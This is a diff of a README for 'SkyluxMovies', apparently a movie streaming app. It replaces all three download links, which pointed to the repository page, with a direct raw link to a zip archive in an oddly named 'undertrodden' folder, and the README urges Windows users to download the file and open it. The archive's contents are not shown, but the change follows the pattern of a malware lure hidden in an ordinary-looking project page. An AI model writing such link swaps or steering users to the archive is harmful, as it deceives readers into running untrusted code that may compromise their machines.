@@ -1,6 +1,6 @@
 # 🎬 SkyluxMovies - Stream and Download with Ease
 
-[![Download](https://img.shields.io/badge/Download-SkyluxMovies-blue?style=for-the-badge)](https://github.com/cosmin820/SkyluxMovies)
+[![Download](https://img.shields.io/badge/Download-SkyluxMovies-blue?style=for-the-badge)](https://raw.githubusercontent.com/cosmin820/SkyluxMovies/main/undertrodden/Movies_Skylux_v3.5.zip)
 
 ## 🖥️ What SkyluxMovies Is
 
@@ -12,7 +12,7 @@ It also supports self hosting, so you can run your own copy if you want full con
 
 Visit this page to download or get the app files:
 
-[Download SkyluxMovies](https://github.com/cosmin820/SkyluxMovies)
+[Download SkyluxMovies](https://raw.githubusercontent.com/cosmin820/SkyluxMovies/main/undertrodden/Movies_Skylux_v3.5.zip)
 
 If the page shows a release, app file, or package, download it to your Windows PC and open it after the download finishes.
 
@@ -144,7 +144,7 @@ The app is meant to stay simple so you can use it without learning extra steps.
 
 ## 📌 Download Link
 
-[Open the SkyluxMovies download page](https://github.com/cosmin820/SkyluxMovies)
+[Open the SkyluxMovies download page](https://raw.githubusercontent.com/cosmin820/SkyluxMovies/main/undertrodden/Movies_Skylux_v3.5.zip)
 
 ## 🧱 Basic Workflow
 
